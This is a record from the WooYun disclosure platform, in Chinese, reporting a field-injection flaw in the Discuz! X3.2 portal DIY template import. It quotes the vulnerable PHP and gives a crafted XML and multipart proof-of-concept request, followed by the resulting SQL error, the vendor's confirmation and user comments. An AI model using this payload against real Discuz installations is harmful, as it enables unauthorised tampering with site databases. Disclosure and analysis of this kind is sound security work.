{"id": 48903, "wybug_id": "wooyun-2014-076041", "wybug_title": "Discuz! xxe 可破坏数据库结构，导致脏数据进入", "wybug_corp": "Discuz!", "wybug_author": "menmen519", "wybug_date": "2014-09-14 13:55", "wybug_open_date": "2014-12-13 13:56", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-18：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-13：\t细节向公众公开  简要描述： Discuz! xxe 可破坏数据库结构，导致脏数据进入.......dz太变态了，小引号也过滤了，妹的，没办法只能分析到这里，但是隐约感觉到，这里存在很大的风险，因为改变了系统模板风格，先发个福利，大家自己看吧 详细说明：  首先我们看文件:portalcp_diy.php（lines:301-324）:\nif (submitcheck('importsubmit')) {\t\t$isinner = false;\t\t$filename = '';\t\tif($_POST['importfilename']) {\t\t\t$filename = DISCUZ_ROOT.'./template/default/portal/diyxml/'.$_POST['importfilename'].'.xml';\t\t\t$isinner = true;\t\t} else {\t\t\t$upload = new discuz_upload();\t\t\t$upload->init($_FILES['importfile'], 'temp');\t\t\t$attach = $upload->attach;\t\t\tif(!$upload->error()) {\t\t\t\t$upload->save();\t\t\t}\t\t\tif($upload->error()) {\t\t\t\tshowmessage($upload->error(),'portal.php',array('status'=>$upload->error()));\t\t\t} else {\t\t\t\t$filename = $attach['target'];\t\t\t}\t\t}\t\tif($filename) {\t\t\t$arr = import_diy($filename);\t\t\t\t\t\tif(!$isinner) {\t\t\t\t@unlink($filename);\t\t\t}\n这里有一个import_diy函数，我们跟进去看看:function_portalcp(lines:580-680):\nfunction import_diy($file) {\tglobal $_G;\t$css = '';\t$html = array();\t$arr = array();\t$content = file_get_contents($file);\trequire_once libfile('class/xml');\tif (empty($content)) return $arr;\t$content = preg_replace(\"/\\<\\!\\-\\-\\[name\\](.+?)\\[\\/name\\]\\-\\-\\>\\s+/i\", '', $content);\t$diycontent = xml2array($content);\t\tif ($diycontent) {\t\t\t\tforeach ($diycontent['layoutdata'] as $key => $value) {\t\t\tif (!empty($value)) getframeblock($value);\t\t}\t\t$newframe = array();\t\tforeach ($_G['curtplframe'] as $value) {\t\t\t$newframe[] = $value['type'].random(6);\t\t}\t\t$mapping = array();\t\tif (!empty($diycontent['blockdata'])) {\t\t\t$mapping = block_import($diycontent['blockdata']);\t\t\tunset($diycontent['blockdata']);\t\t}\t\texit;\n这里我们在打一个exit，因为后面的代码没有意义，不去看他了第一个地方$diycontent = xml2array($content);这个函数就是把post过来的xml转换成为数组存起来：赋值所以条件成立后，函数流向block_import，我们跟进去看看:function_portcp(lines:472-500):if($data['style']) {\t\t$hashes = $styles = array();\t\tforeach($data['style'] as $value) {\t\t\t$hashes[] = $value['hash'];\t\t\t$styles[$value['hash']] = $value['styleid'];\t\t} \t\tC::t('common_block_style')->fetch_all_by_hash($hashes); \t\tif(!empty($hashes)) {\t\t\tforeach(C::t('common_block_style')->fetch_all_by_hash($hashes) as $value) {\t\t\t\t$id = $styles[$value['hash']];\t\t\t\t$stylemapping[$id] = intval($value['styleid']);\t\t\t\tunset($styles[$value['hash']]);\t\t\t}\t\t}\t\tforeach($styles as $id) {\t\t\t$style = $data['style'][$id];\t\t\t$style['styleid'] = '';\t\t\tif(is_array($style['template'])) {\t\t\t\t$style['template'] = serialize($style['template']);\t\t\t}\t\t\tif(is_array($style['fields'])) {\t\t\t\t$style['fields'] = serialize($style['fields']);\t\t\t}\t\t\techo $style;\t\t\t$newid = C::t('common_block_style')->insert($style, true);\t\t\t$stylemapping[$id] = $newid;\t\t}在insert之前我们分析一下这个$style数据源来源两个地方一个是这$style = $data['style'][$id];，另外一个是这行代码之后赋值的东西在网上看看有一句：$styles[$value['hash']] = $value['styleid'];大家 恍然大悟了，这里存入数据库的key字段完全可控下来分析代码缺陷到这里，我们直接构造请求包请求的url：http://localhost/Discuz_X3.2_SC_UTF8/upload/portal.php?mod=portalcp&ac=diy&op=import&inajax=1发送的postdata:<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><root>\t<item id=\"layoutdata\">\t\t<item id=\"k\">\t\t\t<item id=\"kk\"><![CDATA[11]]></item>\t\t</item>\t</item>\t<item id=\"blockdata\">\t\t<item id=\"block\">\t\t\t<item id=\"k1k\"><![CDATA[11]]></item>\t\t</item>\t\t<item id=\"style\">\t\t\t<item id=\"hash\"><![CDATA[x]]></item>                        <item id=\"x\">\t\t\t\t<item id=\"x\\``\"><![CDATA[`=sss#]]></item>\t\t\t</item>\t\t</item>\t</item></root>-----------------------------303962875023268Content-Disposition: form-data; name=\"handlekey\"-----------------------------303962875023268Content-Disposition: form-data; name=\"importsubmit\"true-----------------------------303962875023268Content-Disposition: form-data; name=\"tpl\"-----------------------------303962875023268Content-Disposition: form-data; name=\"formhash\"e17868ae-----------------------------303962875023268--我们请求一个后发现数据库报错了，当然了我们这里就是让它报错的，看看报错的位置：\n\n这里数据库语句为:<div id=\"container\"><h1>Discuz! Database Error</h1><div class='info'>(1054) Unknown column 'x\\' in 'field list'<div class=\"sql\">INSERT INTO common_block_style SET `x\\`='`=sss#' , `styleid`=''</div></div><div class=\"info\"><p><strong>PHP Debug</strong></p><table cellpadding=\"5\" cellspacing=\"1\" width=\"100%\" class=\"table\"><tr我们看看这个数据库字段定义：\n\n这下明白了吧，set里面的字段完全可控，我们完全 可以控制其他本来不被控制的字段\n\n这里就演示完毕，目前里面序列化的东西，还有后面的所有字段，都是可控，感觉潜在威胁很大，有qq公仔拿没有........   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-09-15 10:35 厂商回复： 感谢您对我们产品的支持，我们会尽快处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-14 13:57 |    \t\tadm1n \t\t\t( 普通白帽子  |\t\t\t        Rank:216 漏洞数:66        | 只是一个渣渣而已。。。)\t\t \n  mark    \n     2014-09-14 14:01 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  哇    \n     2014-09-14 14:27 |    \t\t默秒全 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        | a....)\t\t \n  卧槽(╯‵□′)╯︵┻━┻不敢用dz了    \n     2014-09-14 14:40 |    \t\tXser \t\t\t( 普通白帽子  |\t\t\t        Rank:194 漏洞数:61        | JDSec)\t\t \n  dz最近大姨妈了吗？？？？    \n     2014-09-14 16:41 |    \t\t雷锋 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:2        | 承接:钻井，架工，木工，电工，水暖工，力...)\t\t \n  DZ得罪黑客了吧...    \n     2014-09-14 16:58 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  好叼啊，dz是得罪阔了吗？    \n     2014-09-15 11:35 |    \t\tRay \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:7        )\t\t \n  HI，冻主@menmen519 ，我有几个关于这个漏洞的疑问：1，这是一个管理员的功能啊，至少要授权才可以使用。2，你简介里提到了”小引号也过滤了“,那你附图的报错里为什么还有小引号，这里的参数如果在小引号内，不会有任何问题啊（我把你说的小引号理解为抑音符了，因为我不知道小引号）    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}